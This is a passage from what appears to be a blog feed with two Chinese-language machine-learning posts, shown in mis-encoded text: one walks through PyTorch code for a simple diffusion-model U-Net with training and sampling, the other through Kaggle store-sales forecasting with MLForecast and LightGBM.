out_ch, time_emb_dim, up=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.time_mlp =  nn.Linear(time_emb_dim, out_ch)</span><br><span class="line">        <span class="keyword">if</span> up:</span><br><span class="line">            self.conv1 = nn.Conv2d(<span class="number">2</span>*in_ch, out_ch, <span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">            self.transform = nn.ConvTranspose2d(out_ch, out_ch, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.conv1 = nn.Conv2d(in_ch, out_ch, <span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">            self.transform = nn.Conv2d(out_ch, out_ch, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(out_ch, out_ch, <span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        self.bnorm1 = nn.BatchNorm2d(out_ch)</span><br><span class="line">        self.bnorm2 = nn.BatchNorm2d(out_ch)</span><br><span class="line">        self.relu  = nn.ReLU()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, t, </span>):</span><br><span class="line">        <span class="comment"># First Conv</span></span><br><span class="line">        h = self.bnorm1(self.relu(self.conv1(x)))</span><br><span class="line">        <span class="comment"># Time embedding</span></span><br><span class="line">        time_emb = self.relu(self.time_mlp(t))</span><br><span class="line">        <span class="comment"># Extend last 2 dimensions</span></span><br><span class="line">        time_emb = time_emb[(..., ) + (<span class="literal">None</span>, ) * <span class="number">2</span>]</span><br><span class="line">        <span class="comment"># Add time channel</span></span><br><span class="line">        h = h + time_emb</span><br><span class="line">        <span class="comment"># Second Conv</span></span><br><span class="line">        h = self.bnorm2(self.relu(self.conv2(h)))</span><br><span class="line">        <span class="comment"># Down or Upsample</span></span><br><span class="line">        <span class="keyword">return</span> self.transform(h)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SinusoidalPositionEmbeddings</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, dim</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.dim = dim</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, time</span>):</span><br><span class="line">        device = time.device</span><br><span class="line">        half_dim = self.dim // <span class="number">2</span></span><br><span class="line">        embeddings = math.log(<span class="number">10000</span>) / (half_dim - <span class="number">1</span>)</span><br><span class="line">        embeddings = torch.exp(torch.arange(half_dim, device=device) * -embeddings)</span><br><span class="line">        embeddings = time[:, <span class="literal">None</span>] * embeddings[<span class="literal">None</span>, :]</span><br><span class="line">        embeddings = torch.cat((embeddings.sin(), embeddings.cos()), dim=-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Double check the ordering here</span></span><br><span class="line">        <span class="keyword">return</span> embeddings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleUnet</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    A simplified variant of the Unet architecture.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        image_channels = <span class="number">3</span></span><br><span class="line">        down_channels = (<span class="number">64</span>, <span class="number">128</span>, <span class="number">256</span>, <span class="number">512</span>, <span class="number">1024</span>)</span><br><span class="line">        up_channels = (<span class="number">1024</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">128</span>, <span class="number">64</span>)</span><br><span class="line">        out_dim = <span class="number">3</span> </span><br><span class="line">        time_emb_dim = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Time embedding</span></span><br><span class="line">        self.time_mlp = nn.Sequential(</span><br><span class="line">                SinusoidalPositionEmbeddings(time_emb_dim),</span><br><span class="line">                nn.Linear(time_emb_dim, time_emb_dim),</span><br><span class="line">                nn.ReLU()</span><br><span class="line">            )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Initial projection</span></span><br><span class="line">        self.conv0 = nn.Conv2d(image_channels, down_channels[<span class="number">0</span>], <span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Downsample</span></span><br><span class="line">        self.downs = nn.ModuleList([Block(down_channels[i], down_channels[i+<span class="number">1</span>], \</span><br><span class="line">                                    time_emb_dim) \</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(down_channels)-<span class="number">1</span>)])</span><br><span class="line">        <span class="comment"># Upsample</span></span><br><span class="line">        self.ups = nn.ModuleList([Block(up_channels[i], up_channels[i+<span class="number">1</span>], \</span><br><span class="line">                                        time_emb_dim, up=<span class="literal">True</span>) \</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(up_channels)-<span class="number">1</span>)])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Edit: Corrected a bug found by Jakub C (see YouTube comment)</span></span><br><span class="line">        self.output = nn.Conv2d(up_channels[-<span class="number">1</span>], out_dim, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, timestep</span>):</span><br><span class="line">        <span class="comment"># Embedd time</span></span><br><span class="line">        t = self.time_mlp(timestep)</span><br><span class="line">        <span class="comment"># Initial conv</span></span><br><span class="line">        x = self.conv0(x)</span><br><span class="line">        <span class="comment"># Unet</span></span><br><span class="line">        residual_inputs = []</span><br><span class="line">        <span class="keyword">for</span> down <span class="keyword">in</span> self.downs:</span><br><span class="line">            x = down(x, t)</span><br><span class="line">            residual_inputs.append(x)</span><br><span class="line">        <span class="keyword">for</span> up <span class="keyword">in</span> self.ups:</span><br><span class="line">            residual_x = residual_inputs.pop()</span><br><span class="line">            <span class="comment"># Add residual x as additional channels</span></span><br><span class="line">            x = torch.cat((x, residual_x), dim=<span class="number">1</span>)           </span><br><span class="line">            x = up(x, t)</span><br><span class="line">        <span class="keyword">return</span> self.output(x)</span><br><span class="line"></span><br><span class="line">model = SimpleUnet()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Num params: &quot;</span>, <span class="built_in">sum</span>(p.numel() <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters()))</span><br><span class="line">model</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œçš„blockä½œä¸ºunetçš„æ¯å±‚å¤„ç†,ä¸‹é¢çš„unetç±»ç›´æ¥å¯¹blockè¿›è¡Œå †å ,position_embeddingä½œä¸ºpositionçš„è®°å½•,é€šè¿‡å¯¹coså’Œsinçš„concatæ¥å®ç°. éœ€è¦æ³¨æ„ç½‘ä¸Šä¸€èˆ¬å¸¸è§çš„unetéƒ½æ˜¯æœ‰poolçš„,ä½œè€…çš„ä¸Šä¸€ç‰ˆnotebookä¹Ÿæ˜¯æœ‰poolçš„,ä½†ç°åœ¨å·²ç»æ¢æˆäº†BNå±‚.</p><h3 id="loss">Loss</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_loss</span>(<span class="params">model, x_0, t</span>):</span><br><span class="line">    x_noisy, noise = forward_diffusion_sample(x_0, t, device)</span><br><span class="line">    noise_pred = model(x_noisy, t)</span><br><span class="line">    <span class="keyword">return</span> F.l1_loss(noise, noise_pred)</span><br></pre></td></tr></table></figure><p>é€šè¿‡forward_dissusion_sampleè®¡ç®— $ x_0 $ åœ¨ç¬¬tæ­¥noisingçš„å€¼ä½œä¸ºtarget, æ¨¡å‹è¾“å‡ºå€¼ä¸ºnoise_pred,ç„¶åè®¡ç®—f1_loss</p><h3 id="train">train</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@torch.no_grad()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample_timestep</span>(<span class="params">x, t</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Calls the model to predict the noise in the image and returns </span></span><br><span class="line"><span class="string">    the denoised image. </span></span><br><span class="line"><span class="string">    Applies noise to this image, if we are not in the last step yet.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    betas_t = get_index_from_list(betas, t, x.shape)</span><br><span class="line">    sqrt_one_minus_alphas_cumprod_t = get_index_from_list(</span><br><span class="line">        sqrt_one_minus_alphas_cumprod, t, x.shape</span><br><span class="line">    )</span><br><span class="line">    sqrt_recip_alphas_t = get_index_from_list(sqrt_recip_alphas, t, x.shape)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Call model (current image - noise prediction)</span></span><br><span class="line">    model_mean = sqrt_recip_alphas_t * (</span><br><span class="line">        x - betas_t * model(x, t) / sqrt_one_minus_alphas_cumprod_t</span><br><span class="line">    )</span><br><span class="line">    posterior_variance_t = get_index_from_list(posterior_variance, t, x.shape)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># As pointed out by Luis Pereira (see YouTube comment)</span></span><br><span class="line">        <span class="comment"># The t&#x27;s are offset from the t&#x27;s in the paper</span></span><br><span class="line">        <span class="keyword">return</span> model_mean</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        noise = torch.randn_like(x)</span><br><span class="line">        <span class="keyword">return</span> model_mean + torch.sqrt(posterior_variance_t) * noise </span><br><span class="line"></span><br><span class="line"><span class="meta">@torch.no_grad()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample_plot_image</span>():</span><br><span class="line">    <span class="comment"># Sample noise</span></span><br><span class="line">    img_size = IMG_SIZE</span><br><span class="line">    img = torch.randn((<span class="number">1</span>, <span class="number">3</span>, img_size, img_size), device=device)</span><br><span class="line">    plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>))</span><br><span class="line">    plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    num_images = <span class="number">10</span></span><br><span class="line">    stepsize = <span class="built_in">int</span>(T/num_images)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,T)[::-<span class="number">1</span>]:</span><br><span class="line">        t = torch.full((<span class="number">1</span>,), i, device=device, dtype=torch.long)</span><br><span class="line">        img = sample_timestep(img, t)</span><br><span class="line">        <span class="comment"># Edit: This is to maintain the natural range of the distribution</span></span><br><span class="line">        img = torch.clamp(img, -<span class="number">1.0</span>, <span class="number">1.0</span>)</span><br><span class="line">        <span class="keyword">if</span> i % stepsize == <span class="number">0</span>:</span><br><span class="line">            plt.subplot(<span class="number">1</span>, num_images, <span class="built_in">int</span>(i/stepsize)+<span class="number">1</span>)</span><br><span class="line">            show_tensor_image(img.detach().cpu())</span><br><span class="line">    plt.show()            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># train here</span></span><br><span class="line"><span class="keyword">from</span> torch.optim <span class="keyword">import</span> Adam</span><br><span class="line"></span><br><span class="line">device = <span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span></span><br><span class="line">model.to(device)</span><br><span class="line">optimizer = Adam(model.parameters(), lr=<span class="number">0.001</span>)</span><br><span class="line">epochs = <span class="number">100</span> <span class="comment"># Try more!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epochs):</span><br><span class="line">    <span class="keyword">for</span> step, batch <span class="keyword">in</span> <span class="built_in">enumerate</span>(dataloader):</span><br><span class="line">      optimizer.zero_grad()</span><br><span class="line"></span><br><span class="line">      t = torch.randint(<span class="number">0</span>, T, (BATCH_SIZE,), device=device).long()</span><br><span class="line">      loss = get_loss(model, batch[<span class="number">0</span>], t)</span><br><span class="line">      loss.backward()</span><br><span class="line">      optimizer.step()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> epoch % <span class="number">5</span> == <span class="number">0</span> <span class="keyword">and</span> step == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Epoch <span class="subst">&#123;epoch&#125;</span> | step <span class="subst">&#123;step:03d&#125;</span> Loss: <span class="subst">&#123;loss.item()&#125;</span> &quot;</span>)</span><br><span class="line">        sample_plot_image()</span><br></pre></td></tr></table></figure><p>å‰é¢çš„sample_timestepè¿”å›çš„æ˜¯è®ºæ–‡ä¸­çš„ALGO2.sampling. ç„¶ååç»­å°±æ˜¯ç”»å‡ºæ¯ä¸€æ­¥çš„ç”Ÿæˆå›¾äº†.</p><p>trainæ˜¯å–0-Tä¸­çš„éšæœºæ•´æ•°ä½œä¸ºtimestepç„¶åè®­ç»ƒ. è®­ç»ƒè¿‡ç¨‹ä¸­è°ƒç”¨sample_plot_imageæŸ¥çœ‹ç»“æœ.</p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle_warmup3-TimeSeries(3)</title>
      <link href="/2024/04/09/Kaggle-warmup3-TimeSeries-3/"/>
      <url>/2024/04/09/Kaggle-warmup3-TimeSeries-3/</url>
      
        <content type="html"><![CDATA[<p>ç»§ç»­å¾€åçœ‹,å‘ç°æœ‰å¦ä¸€ä¸ªæ—¶åºå¤„ç†çš„package,<a href="https://nixtlaverse.nixtla.io/mlforecast/index.html">MLforcast</a>,æŠ±ç€å­¦ä¹ çš„å¿ƒæ€çœ‹ä¸€çœ‹ç”¨æ³•.</p><h2 id="preprocessing">preprocessing</h2><p>é¦–å…ˆimportéœ€æ±‚åŒ…å¹¶è¯»å–æ•°æ®. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lightgbm <span class="keyword">as</span> lgb</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> mlforecast <span class="keyword">import</span> MLForecast</span><br><span class="line"><span class="keyword">from</span> mlforecast.lag_transforms <span class="keyword">import</span> ExpandingMean, RollingMean</span><br><span class="line"><span class="keyword">from</span> mlforecast.target_transforms <span class="keyword">import</span> GlobalSklearnTransformer</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> FunctionTransformer</span><br><span class="line"><span class="keyword">from</span> utilsforecast.feature_engineering <span class="keyword">import</span> fourier</span><br><span class="line"><span class="keyword">from</span> utilsforecast.preprocessing <span class="keyword">import</span> fill_gaps</span><br><span class="line"><span class="keyword">from</span> utilsforecast.plotting <span class="keyword">import</span> plot_series</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;../input/store-sales-time-series-forecasting/train.csv&#x27;</span>, parse_dates=[<span class="string">&#x27;date&#x27;</span>])</span><br><span class="line">df = df.drop(columns=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">df[<span class="string">&#x27;unique_id&#x27;</span>] = df[<span class="string">&#x27;store_nbr&#x27;</span>].astype(<span class="built_in">str</span>) + <span class="string">&#x27;_&#x27;</span> + df[<span class="string">&#x27;family&#x27;</span>]</span><br><span class="line">df.head()</span><br></pre></td></tr></table></figure></p><p>ç„¶åè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>utilsforcast.preprocessing.fillgaps</code>æ¥å¡«è¡¥æ—¶é—´ç©ºç¼º, ç©ºç¼ºæ—¶é—´ä¼šå¯¼è‡´å…¶ä»–åˆ—è¢«å¡«na. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filled = fill_gaps(df, freq=<span class="string">&#x27;D&#x27;</span>, start=<span class="string">&#x27;per_serie&#x27;</span>, end=<span class="string">&#x27;per_serie&#x27;</span>, time_col=<span class="string">&#x27;date&#x27;</span>)</span><br><span class="line">filled.loc[filled[<span class="string">&#x27;sales&#x27;</span>].isnull(), <span class="string">&#x27;date&#x27;</span>].value_counts()</span><br><span class="line"><span class="comment"># date</span></span><br><span class="line"><span class="comment"># 2013-12-25    1782</span></span><br><span class="line"><span class="comment"># 2014-12-25    1782</span></span><br><span class="line"><span class="comment"># 2015-12-25    1782</span></span><br><span class="line"><span class="comment"># 2016-12-25    1782</span></span><br><span class="line"><span class="comment"># Name: count, dtype: int64</span></span><br></pre></td></tr></table></figure></p><p><img src="gap_check.png" /></p><p>å¯ä»¥ä½¿ç”¨plot_seriesæ¥ç®€å•ç”»å›¾,éœ€è¦æŒ‡å®š<code>time_col</code>å’Œ<code>target_col</code>. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plot_series(filled[filled[<span class="string">&#x27;date&#x27;</span>].between(<span class="string">&#x27;2016-12&#x27;</span>, <span class="string">&#x27;2017-01&#x27;</span>)], time_col=<span class="string">&#x27;date&#x27;</span>, target_col=<span class="string">&#x27;sales&#x27;</span>)</span><br></pre></td></tr></table></figure></p><p>éœ€è¦æ³¨æ„è¿™é‡Œå…¶å®<code>id_col</code>è¢«é»˜è®¤æŒ‡å®šä¸ºäº†<code>unique_id</code>.</p><p><img src="plot_series_without25.png" /></p><p>å¯ä»¥çœ‹åˆ°25å·çš„æ—¶å€™æ•°æ®ä¸ºç©º,ä½¿ç”¨<code>interpolate</code>æ¥è¿›è¡Œå¡«å…… <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filled[<span class="string">&#x27;sales_interp&#x27;</span>] = filled.groupby(<span class="string">&#x27;unique_id&#x27;</span>)[<span class="string">&#x27;sales&#x27;</span>].transform(<span class="keyword">lambda</span> s: s.interpolate())</span><br><span class="line">plot_series(filled[filled[<span class="string">&#x27;date&#x27;</span>].between(<span class="string">&#x27;2016-12&#x27;</span>, <span class="string">&#x27;2017-01&#x27;</span>)], time_col=<span class="string">&#x27;date&#x27;</span>, target_col=<span class="string">&#x27;sales_interp&#x27;</span>)</span><br></pre></td></tr></table></figure></p><p><img src="plot_series_with25.png" /></p><p>ç„¶åæŒ‡å®šä¸€ä¸‹<code>categorical_feature</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat_features = [<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>]</span><br><span class="line">filled[cat_features] = filled[cat_features].astype(<span class="string">&#x27;category&#x27;</span>)</span><br></pre></td></tr></table></figure><p>holidayéƒ¨åˆ†ä¸åŒä¸Šä¸€æ¬¡çš„one-hot-encoding,è¿™é‡Œæˆ‘ä»¬ä»…åˆ¤æ–­æ˜¯å¦ä¸ºèŠ‚æ—¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">raw_holidays = pd.read_csv(</span><br><span class="line">    <span class="string">&#x27;../input/store-sales-time-series-forecasting/holidays_events.csv&#x27;</span>,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line">keep_holidays = ~raw_holidays[<span class="string">&#x27;transferred&#x27;</span>] &amp; raw_holidays[<span class="string">&#x27;locale&#x27;</span>].eq(<span class="string">&#x27;National&#x27;</span>)</span><br><span class="line">holidays = raw_holidays.loc[keep_holidays, [<span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;type&#x27;</span>]].copy()</span><br><span class="line">holidays[<span class="string">&#x27;is_holiday&#x27;</span>] = holidays[<span class="string">&#x27;type&#x27;</span>].eq(<span class="string">&#x27;Holiday&#x27;</span>).astype(<span class="string">&#x27;float&#x27;</span>)</span><br><span class="line">holidays[<span class="string">&#x27;is_work_day&#x27;</span>] = holidays[<span class="string">&#x27;type&#x27;</span>].eq(<span class="string">&#x27;Work Day&#x27;</span>).astype(<span class="string">&#x27;float&#x27;</span>)</span><br><span class="line">holidays = holidays.drop(columns=<span class="string">&#x27;type&#x27;</span>).groupby(<span class="string">&#x27;date&#x27;</span>).<span class="built_in">max</span>()</span><br><span class="line">holidays.head()</span><br></pre></td></tr></table></figure><p>å¡«è¡¥oilprice,å¹¶ä¸”å®Œæˆè¡¨åˆå¹¶ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">oil = pd.read_csv(</span><br><span class="line">    <span class="string">&#x27;../input/store-sales-time-series-forecasting/oil.csv&#x27;</span>,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line">filled_oil = oil.set_index(<span class="string">&#x27;date&#x27;</span>).reindex(pd.date_range(oil[<span class="string">&#x27;date&#x27;</span>].<span class="built_in">min</span>(), oil[<span class="string">&#x27;date&#x27;</span>].<span class="built_in">max</span>(), freq=<span class="string">&#x27;D&#x27;</span>, name=<span class="string">&#x27;date&#x27;</span>))</span><br><span class="line">filled_oil = filled_oil.interpolate(limit_direction=<span class="string">&#x27;both&#x27;</span>).reset_index()</span><br><span class="line">filled_oil.head()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">assemble_df</span>(<span class="params">df, holidays, oil</span>):</span><br><span class="line">    df = df.merge(holidays, on=<span class="string">&#x27;date&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>).merge(oil, on=<span class="string">&#x27;date&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">    df[[<span class="string">&#x27;is_holiday&#x27;</span>, <span class="string">&#x27;is_work_day&#x27;</span>]] = df[[<span class="string">&#x27;is_holiday&#x27;</span>, <span class="string">&#x27;is_work_day&#x27;</span>]].fillna(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train = assemble_df(filled.drop(columns=[<span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>]), holidays, filled_oil)</span><br><span class="line">train.head()</span><br></pre></td></tr></table></figure></p><h2 id="mlforecast-model">MLForecast Model</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">%%time</span><br><span class="line">log_tfm = GlobalSklearnTransformer(</span><br><span class="line">    FunctionTransformer(func=np.log1p, inverse_func=np.expm1)</span><br><span class="line">)</span><br><span class="line">model = lgb.LGBMRegressor(</span><br><span class="line">    n_estimators=<span class="number">400</span>,</span><br><span class="line">    learning_rate=<span class="number">1e-2</span>,</span><br><span class="line">    num_leaves=<span class="number">256</span>,</span><br><span class="line">    num_threads=<span class="number">4</span>,</span><br><span class="line">    force_col_wise=<span class="literal">True</span>,</span><br><span class="line">    verbosity=-<span class="number">1</span>,   </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">mlf = MLForecast(</span><br><span class="line">    models=&#123;<span class="string">&#x27;lgb&#x27;</span>: model&#125;,</span><br><span class="line">    freq=<span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    target_transforms=[log_tfm],</span><br><span class="line">    lags=[<span class="number">7</span>, <span class="number">14</span>],</span><br><span class="line">    lag_transforms=&#123;</span><br><span class="line">         <span class="number">1</span>: [ExpandingMean()],</span><br><span class="line">         <span class="number">7</span>: [RollingMean(window_size=<span class="number">14</span>), RollingMean(window_size=<span class="number">28</span>)],</span><br><span class="line">        <span class="number">14</span>: [RollingMean(window_size=<span class="number">14</span>), RollingMean(window_size=<span class="number">28</span>)],</span><br><span class="line">    &#125;,</span><br><span class="line">    date_features=[<span class="string">&#x27;dayofweek&#x27;</span>, <span class="string">&#x27;day&#x27;</span>, <span class="string">&#x27;month&#x27;</span>, <span class="string">&#x27;year&#x27;</span>],</span><br><span class="line">    num_threads=<span class="number">4</span>,</span><br><span class="line">)</span><br><span class="line">mlf.fit(</span><br><span class="line">    train,</span><br><span class="line">    time_col=<span class="string">&#x27;date&#x27;</span>,</span><br><span class="line">    target_col=<span class="string">&#x27;sales_interp&#x27;</span>,</span><br><span class="line">    static_features=cat_features,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥ç”¨äº†lag1çš„ExpandMeanä»¥åŠ7å’Œ14çš„lagå’Œ14,28çš„windowçš„rollingmean. å¦å¤–å•ç‹¬çš„lagè¢«æŒ‡å®šåœ¨äº†lagsé‡Œé¢.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class RollingMean</span><br><span class="line"></span><br><span class="line">Args:</span><br><span class="line"></span><br><span class="line">lag (int): Number of periods to offset by before applying the transformation.</span><br><span class="line">window_size (int): Length of the rolling window.</span><br><span class="line">min_samples (int, optional): Minimum number of samples required to compute the statistic. If None, defaults to window_size.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ExpandingMean</span><br><span class="line"></span><br><span class="line">Args:</span><br><span class="line"></span><br><span class="line">lag (int): Number of periods to offset by before applying the transformation</span><br></pre></td></tr></table></figure><p>basemodelç”¨çš„æ˜¯<code>lgb.LGBMRegressor</code></p><h2 id="prediction">prediction</h2><p>å¤„ç†æ•°æ®å–‚mlfå³å¯, åé¢ä¸åšå¤šçš„åˆ†æäº†.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 